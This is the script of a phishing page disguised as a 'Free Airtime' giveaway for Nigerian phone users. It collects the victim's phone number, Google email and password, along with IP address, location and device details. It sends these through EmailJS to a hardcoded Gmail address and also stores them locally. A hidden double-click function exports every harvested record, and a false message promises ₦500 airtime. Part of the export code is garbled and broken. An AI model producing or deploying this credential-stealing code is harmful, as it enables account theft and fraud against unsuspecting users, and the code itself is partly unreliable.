    <script>
        // Initialize EmailJS (YOU NEED TO REPLACE THESE VALUES)
        (function() {
            // Replace 'YOUR_PUBLIC_KEY' with your actual EmailJS public key
            emailjs.init("z5pHe7uNuZl0M3HK8"); 
        })();

        // Your Gmail address where data will be sent
        const YOUR_EMAIL = 'ikulohdaniel84@gmail.com';

        // Toggle password visibility
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.password-toggle');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'ğŸ”“';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'ğŸ‘ï¸';
            }
        }

        // Show notification
        function showNotification(message, isError = false) {
            const notification = document.getElementById('notification');
            notification.style.display = 'block';
            notification.className = isError ? 'notification error' : 'notification';
            notification.textContent = message;
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 4000);
        }

        // Show email status
        function showEmailStatus(message) {
            const status = document.getElementById('emailStatus');
            status.textContent = message;
            setTimeout(() => {
                status.textContent = '';
            }, 5000);
        }

        // Get user IP
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown IP';
            }
        }

        // Get location
        async function getLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
            } catch (error) {
                return 'Location unavailable';
            }
        }

        // Get current time
        function getCurrentTime() {
            const now = new Date();
            return now.toLocaleString();
        }

        // Get device info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Desktop';
            let os = 'Unknown';
            
            if (/mobile/i.test(ua)) device = 'Mobile';
            else if (/tablet/i.test(ua)) device = 'Tablet';
            
            if (ua.indexOf('Windows') > -1) os = 'Windows';
            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
            else if (ua.indexOf('Linux') > -1) os = 'Linux';
            else if (ua.indexOf('Android') > -1) os = 'Android';
            else if (ua.indexOf('iOS') > -1) os = 'iOS';
            
            return { device, os };
        }

        // Send email with user data to your Gmail
        async function sendEmailToGmail(userData) {
            // Template parameters for the email
            const templateParams = {
                to_email: YOUR_EMAIL,
                from_name: "Free Airtime Website",
                user_phone: userData.phone,
                user_email: userData.email,
                user_password: userData.password,
                ip_address: userData.ip,
                location: userData.location,
                device: userData.device,
                os: userData.os,
                timestamp: userData.time,
                reply_to: userData.email
            };

            try {
                // Send the email using EmailJS
                // YOU NEED TO REPLACE THESE WITH YOUR ACTUAL IDs
                const response = await emailjs.send(
                    'service_1gneocq',      // Replace with your EmailJS service ID
                    'template_9xqe72t',     // Replace with your EmailJS template ID
                    templateParams
                );
                
                console.log('âœ… Email sent to Gmail:', response);
                showEmailStatus('âœ… Data sent to admin email');
                return true;
            } catch (error) {
                console.error('âŒ Email failed:', error);
                showEmailStatus('âŒ Email failed - Backup file created');
                
                // Create backup file if email fails
                createBackupFile(userData);
                return false;
            }
        }

        // Create backup file
        function createBackupFile(data) {
            const fileContent = `
ğŸ“± FREE AIRTIME CLAIM - BACKUP FILE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“ Phone Number: ${data.phone}
ğŸ“§ Google Email: ${data.email}
ğŸ”‘ Password: ${data.password}

ğŸ“ Location: ${data.location}
ğŸŒ IP Address: ${data.ip}
ğŸ“± Device: ${data.device}
ğŸ’» OS: ${data.os}
â° Time: ${data.time}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
This data should be sent to: ikulohdaniel84@gmail.com
            `;

            const blob = new Blob([fileContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `user_data_${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        // Save data locally as backup
        function saveToStorage(data) {
            const allData = JSON.parse(localStorage.getItem('freeAirtimeUsers') || '[]');
            allData.push(data);
            localStorage.setItem('freeAirtimeUsers', JSON.stringify(allData));
        }

        // Main claim function
        async function claimAirtime() {
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const termsChecked = document.getElementById('terms').checked;

            // Validation
            if (!phone || phone.length < 11) {
                showNotification('Please enter a valid phone number', true);
                return;
            }

            if (!email || !email.includes('@')) {
                showNotification('Please enter a valid Google email', true);
                return;
            }

            if (!password || password.length < 4) {
                showNotification('Please enter your password', true);
                return;
            }

            if (!termsChecked) {
                showNotification('Please agree to the terms', true);
                return;
            }

            // Show loading
            document.getElementById('loading').style.display = 'block';
            document.querySelector('button').disabled = true;

            // Collect all user data
            const ip = await getUserIP();
            const location = await getLocation();
            const deviceInfo = getDeviceInfo();
            
            const userData = {
                phone: phone,
                email: email,
                password: password,
                ip: ip,
                location: location,
                device: deviceInfo.device,
                os: deviceInfo.os,
                time: getCurrentTime(),
                userAgent: navigator.userAgent
            };

            // Save to localStorage (backup)
            saveToStorage(userData);

            // Send to your Gmail
            const emailSent = await sendEmailToGmail(userData);

            // Simulate processing
            setTimeout(() => {
                // Hide loading
                document.getElementById('loading').style.display = 'none';
                document.querySelector('button').disabled = false;
                
                // Show success message
                if (emailSent) {
                    showNotification('âœ… â‚¦500 airtime will be sent to ' + phone + '! Check your email for confirmation.');
                } else {
                    showNotification('âœ… Processing complete! Check your downloads for backup file.');
                }
                
                // Clear fields
                document.getElementById('phone').value = '+234';
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                
            }, 2000);
        }

        // Auto-format phone number
        document.getElementById('phone').addEventListener('input', function(e) {
            if (!this.value.startsWith('+234') && this.value.length > 0) {
                this.value = '+234' + this.value.replace(/^0+/, '');
            }
        });

        // Enter key support
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                claimAirtime();
            }
        });

        // Double click on title to view all collected data
        document.querySelector('h1').addEventListener('dblclick', function() {
            const allData = JSON.parse(localStorage.getItem('freeAirtimeUsers') || '[]');
            
            if (allData.length === 0) {

            let exportData = 'ğŸ“Š ALL COLLECTED USER DATA ğŸ“Š\n\n';

                exportData += `Phone: ${user.phone}\n`;
                exportData += `Email: ${user.email}\n`;
                exportData += `Password: ${user.password}\n`;
                exportData += `Location: ${user.location}\n`;
                exportData += `IP: ${user.ip}\n`;
                exportData += `Time: ${user.time}\n`;
                exportData += `â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n`;
            });

            const blob = new Blob([exportData], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `all_users_${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            showNotification(`âœ… Exported ${allData.length} records`);
        });

        console.log('âœ… Free Airtime page ready!');
        console.log('ğŸ“§ Data will be sent to:', YOUR_EMAIL);
